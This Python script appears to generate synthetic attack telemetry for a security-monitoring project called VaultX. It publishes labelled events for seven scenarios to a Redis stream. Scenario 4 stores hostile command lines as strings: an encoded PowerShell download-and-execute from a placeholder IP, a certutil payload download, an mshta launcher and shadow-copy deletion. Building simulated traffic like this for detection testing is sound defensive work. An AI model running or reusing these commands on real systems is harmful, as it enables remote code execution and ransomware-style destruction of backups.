#!/usr/bin/env python3
"""
VaultX — Multi-Stage Attack Scenario Traffic Generator
Bharat Electronics Components Pvt. Ltd. (BECPL), Pune

Generates realistic attack traffic for the 7 project scenarios defined in the brief:

1. Scenario 1: Compromised Third-Party Vendor Access
   - Authenticated vendor identity (PrecisionTech SMT Maintenance), followed by
     unauthorized lateral movement probes from DMZ towards internal engineering repos.
2. Scenario 2: Service Credential Misuse
   - Machine identity (svc_erp_mes_sync) performing abnormal off-hours queries
     and pulling confidential patent/design files.
3. Scenario 3: Lateral Movement
   - A compromised corporate workstation scanning and attempting SSH/RDP/SMB connections
     rapidly across multiple /24 subnets.
4. Scenario 4: LOTL (Living off the Land)
   - PowerShell encoded commands, certutil downloading payloads, mshta executing remote HTA.
5. Scenario 5: Encrypted External Communication (C2 Exfiltration)
   - High-entropy, beaconing TLS sessions to unclassified external IPs with suspicious SNI/JA3.
6. Scenario 6: Manufacturing Network Anomaly
   - Unauthorized corporate IP sending Modbus FC 0x05 / 0x10 write commands directly to
     safety and SMT line PLCs.
7. Scenario 7: Vulnerability Exposure & Exploitation Probing
   - Aggressive SYN and version sweeps against legacy unpatched machines (e.g. legacy Windows 7
     test rig with EternalBlue vulnerability exposure).

Each event is labeled:
  "traffic_type": "attack"
  "scenario": "scenario_X"
  "label": "malicious"
Output Stream: 'events:simulation'
"""

import os
import sys
import time
import json
import random
import uuid
import logging
import argparse
from datetime import datetime, timezone
from typing import Dict, Any, List

try:
    import redis
except ImportError:
    redis = None

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] [AttackGen] %(message)s"
)
logger = logging.getLogger("attack_gen")

REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379/0")
STREAM_NAME = "events:simulation"

class AttackScenarioGenerator:
    def __init__(self, redis_url: str, stream_name: str = STREAM_NAME):
        self.redis_url = redis_url
        self.stream_name = stream_name
        self.r = None
        self._init_redis()

    def _init_redis(self):
        if redis:
            try:
                self.r = redis.from_url(self.redis_url)
                self.r.ping()
                logger.info(f"Connected to Redis for attack simulation stream '{self.stream_name}'")
            except Exception as e:
                logger.warning(f"Redis not available: {e}. Outputting attack telemetry to stdout.")
                self.r = None

    def publish(self, scenario_id: str, attack_type: str, event: Dict[str, Any]):
        event["traffic_type"] = "attack"
        event["scenario"] = scenario_id
        event["attack_type"] = attack_type
        event["label"] = "malicious"
        event["timestamp"] = datetime.now(timezone.utc).isoformat()
        event["simulation_id"] = str(uuid.uuid4())[:8]

        if self.r:
            try:
                self.r.xadd(self.stream_name, {"event": json.dumps(event)}, maxlen=100000, approximate=True)
            except Exception as e:
                logger.error(f"Redis publish failure: {e}")
        else:
            print(json.dumps(event))

    # -------------------------------------------------------------------------
    # Scenario 1: Compromised Third-Party Vendor Access
    # -------------------------------------------------------------------------
    def run_scenario_1(self, count: int = 5):
        logger.info("[Scenario 1] Simulating Compromised Third-Party Vendor Access...")
        vendor_ip = "172.20.50.100"  # Assigned VPN tunnel IP for PrecisionTech
        target_internal = ["172.20.20.30", "172.20.10.20", "172.20.70.10"]

        for i in range(count):
            target = random.choice(target_internal)
            port = random.choice([22, 445, 3389, 5432])
            ev = {
                "source_layer": "network_flow",
                "identity": "VEND-SMT-MAINT (PrecisionTech)",
                "authenticated_user": "maint_tech_rajesh",
                "src_ip": vendor_ip,
                "dst_ip": target,
                "src_port": random.randint(50000, 60000),
                "dst_port": port,
                "protocol": "TCP",
                "action": "CONNECTION_ATTEMPT",
                "violation": "VENDOR_POLICY_CROSS_SEGMENT_VIOLATION",
                "details": f"Vendor IP {vendor_ip} attempting lateral ingress into core internal asset {target}:{port} without bastion authorization"
            }
            self.publish("scenario_1", "compromised_vendor_lateral_ingress", ev)
            time.sleep(0.2)

    # -------------------------------------------------------------------------
    # Scenario 2: Service Credential Misuse
    # -------------------------------------------------------------------------
    def run_scenario_2(self, count: int = 4):
        logger.info("[Scenario 2] Simulating Service Credential Misuse...")
        service_identity = "svc_erp_mes_sync"
        compromised_host = "172.20.10.20"

        for i in range(count):
            ev = {
                "source_layer": "identity_application",
                "service_account": service_identity,
                "executing_host": compromised_host,
                "target_resource": random.choice([
                    "internal-git://firmware-repo.becpl.internal/patents/secure_boot_keys.enc",
                    "s3://becpl-confidential-patents/gerber_layer_rev4.zip",
                    "sql://erp-db.becpl.internal/payroll_financial_ledger"
                ]),
                "request_method": "DOWNLOAD_BULK",
                "time_of_day": "02:44:12 IST (Off-hours)",
                "normal_profile": "ERP to MES operational tables only (06:00 - 22:00 IST)",
                "anomaly_score": 0.94,
                "bytes_transferred": random.randint(15000000, 85000000)
            }
            self.publish("scenario_2", "service_credential_anomaly", ev)
            time.sleep(0.2)

    # -------------------------------------------------------------------------
    # Scenario 3: Lateral Movement
    # -------------------------------------------------------------------------
    def run_scenario_3(self, count: int = 12):
        logger.info("[Scenario 3] Simulating Cross-Subnet Rapid Lateral Movement...")
        compromised_ip = "172.20.10.105"  # Corporate IT desktop
        target_subnets = [
            ("172.20.20", [15, 20, 30]),  # Engineering
            ("172.20.30", [10, 20, 25]),  # OT
            ("172.20.40", [10, 20])       # Warehouse
        ]

        for i in range(count):
            sub, hosts = random.choice(target_subnets)
            dst_ip = f"{sub}.{random.choice(hosts)}"
            port = random.choice([445, 135, 3389, 5985])

            ev = {
                "source_layer": "network_flow",
                "src_ip": compromised_ip,
                "dst_ip": dst_ip,
                "src_port": random.randint(49152, 65535),
                "dst_port": port,
                "tcp_flags": "SYN",
                "lateral_technique": "T1021.002_SMB_Windows_Admin_Shares",
                "observed_cross_subnets_in_window": 3,
                "distinct_targets_contacted": i + 1
            }
            self.publish("scenario_3", "rapid_lateral_movement_sweep", ev)
            time.sleep(0.15)

    # -------------------------------------------------------------------------
    # Scenario 4: Living off the Land (LOTL)
    # -------------------------------------------------------------------------
    def run_scenario_4(self, count: int = 5):
        logger.info("[Scenario 4] Simulating Living off the Land (LOTL) Endpoint Execution...")
        lotl_commands = [
            {
                "bin": "powershell.exe",
                "cmd": "powershell.exe -ExecutionPolicy Bypass -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYAMwAvAGEALgBwAHMAMQAnACkA",
                "mitre": "T1059.001",
                "desc": "Encoded PowerShell execution downloading remote stage"
            },
            {
                "bin": "certutil.exe",
                "cmd": "certutil.exe -urlcache -split -f http://203.0.113.88/svchost_update.exe C:\\Windows\\Temp\\update.exe",
                "mitre": "T1105",
                "desc": "Certutil LOLBIN abused for ingress tool transfer"
            },
            {
                "bin": "mshta.exe",
                "cmd": "mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -w hidden -enc...\"\",0)\")",
                "mitre": "T1218.005",
                "desc": "Mshta inline VBScript payload execution"
            },
            {
                "bin": "vssadmin.exe",
                "cmd": "vssadmin.exe delete shadows /all /quiet",
                "mitre": "T1490",
                "desc": "Shadow copy destruction in preparation for ransomware"
            }
        ]

        for i in range(count):
            item = random.choice(lotl_commands)
            ev = {
                "source_layer": "endpoint_telemetry",
                "os": "windows",
                "host": "CORP-WS-012.becpl.internal",
                "host_ip": "172.20.10.112",
                "user": "BECPL\\rajesh.sharma",
                "process_name": f"C:\\Windows\\System32\\{item['bin']}",
                "command_line": item["cmd"],
                "parent_process": "C:\\Windows\\explorer.exe",
                "mitre_technique": item["mitre"],
                "mitre_description": item["desc"],
                "event_id": 1
            }
            self.publish("scenario_4", "living_off_the_land_execution", ev)
            time.sleep(0.2)

    # -------------------------------------------------------------------------
    # Scenario 5: Encrypted External Communication (C2 Exfiltration)
    # -------------------------------------------------------------------------
    def run_scenario_5(self, count: int = 6):
        logger.info("[Scenario 5] Simulating Encrypted External C2 Communication...")
        internal_src = "172.20.20.18"  # EDA Workstation in Engineering
        c2_ip = "198.51.100.24"

        for i in range(count):
            ev = {
                "source_layer": "network_flow",
                "src_ip": internal_src,
                "dst_ip": c2_ip,
                "src_port": random.randint(50000, 60000),
                "dst_port": 443,
                "protocol": "TLSv1.3",
                "sni": "cdn-cloud-update-service.top",
                "ja3_fingerprint": "6734f37431670b3ab4292b8f60f29984",
                "ja3s_fingerprint": "15af977ce25de452b96affa2addb1036",
                "tls_cipher": "TLS_AES_256_GCM_SHA384",
                "beaconing_interval_seconds": 30.0,
                "jitter": 0.04,
                "payload_entropy": 7.96,
                "bytes_out": random.randint(250000, 2000000),
                "bytes_in": 1240,
                "classification": "ENCRYPTED_C2_DATA_EXFILTRATION"
            }
            self.publish("scenario_5", "encrypted_c2_communication", ev)
            time.sleep(0.25)

    # -------------------------------------------------------------------------
    # Scenario 6: Manufacturing Network Anomaly (Modbus Sabotage)
    # -------------------------------------------------------------------------
    def run_scenario_6(self, count: int = 6):
        logger.info("[Scenario 6] Simulating Manufacturing Network Anomaly (Modbus Sabotage)...")
        rogue_src = "172.20.10.108"  # Corporate IT host attempting OT command injection
        plcs = [
            ("172.20.30.20", "Pick-and-Place Machine SMT-01"),
            ("172.20.30.25", "Reflow Oven Thermal Safety PLC")
        ]

        for i in range(count):
            plc_ip, name = random.choice(plcs)
            func_code = random.choice([5, 16])
            func_name = "Write Single Coil" if func_code == 5 else "Write Multiple Registers"
            reg = 5001 if "Reflow" in name else 102

            ev = {
                "source_layer": "ot_scada_protocol",
                "protocol": "MODBUS_TCP",
                "src_ip": rogue_src,
                "dst_ip": plc_ip,
                "plc_name": name,
                "src_port": random.randint(49152, 65535),
                "dst_port": 502,
                "function_code": func_code,
                "function_name": func_name,
                "register_target": reg,
                "write_value": [65535, 65535] if func_code == 16 else 65280,
                "is_authorized_client": False,
                "allowed_clients": ["172.20.30.10", "172.20.30.11", "172.20.20.15"],
                "hazard_level": "CRITICAL_SAFETY_IMPACT",
                "violation": "UNAUTHORIZED_OT_WRITE_INJECTION"
            }
            self.publish("scenario_6", "manufacturing_modbus_sabotage", ev)
            time.sleep(0.2)

    # -------------------------------------------------------------------------
    # Scenario 7: Vulnerability Exposure & Port Scanning
    # -------------------------------------------------------------------------
    def run_scenario_7(self, count: int = 15):
        logger.info("[Scenario 7] Simulating Vulnerability Probing against Legacy Asset...")
        scanner_ip = "172.20.10.110"
        legacy_target = "172.20.20.45"  # Unpatched Windows 7 Embedded Test Station

        vulnerable_ports = [445, 139, 3389, 8080, 21, 23, 502, 102]

        for p in vulnerable_ports:
            ev = {
                "source_layer": "network_flow",
                "src_ip": scanner_ip,
                "dst_ip": legacy_target,
                "src_port": random.randint(50000, 60000),
                "dst_port": p,
                "scan_type": "SYN_STEALTH_PORT_SCAN",
                "tool_signature": "Nmap NSE Engine",
                "target_os": "Windows 7 SP1 Embedded (Known EOL, vulnerable to MS17-010 / EternalBlue)",
                "target_cve": "CVE-2017-0144",
                "response_flags": "SYN-ACK (Port Open)" if p in [445, 139, 3389] else "RST"
            }
            self.publish("scenario_7", "vulnerability_probing_sweep", ev)
            time.sleep(0.1)

    def run_all(self):
        logger.info("Starting complete multi-scenario attack execution sequence...")
        self.run_scenario_1()
        self.run_scenario_2()
        self.run_scenario_3()
        self.run_scenario_4()
        self.run_scenario_5()
        self.run_scenario_6()
        self.run_scenario_7()
        logger.info("All 7 attack scenarios successfully executed and published to Redis.")

def main():
    parser = argparse.ArgumentParser(description="VaultX Multi-Stage Attack Scenario Generator")
    parser.add_argument("--redis", default=REDIS_URL, help="Redis URL")
    parser.add_argument("--scenario", choices=["1", "2", "3", "4", "5", "6", "7", "all"], default="all", help="Attack scenario to trigger")
    args = parser.parse_args()

    gen = AttackScenarioGenerator(args.redis)
    if args.scenario == "all":
        gen.run_all()
    else:
        fn = getattr(gen, f"run_scenario_{args.scenario}")
        fn()

if __name__ == "__main__":
    main()
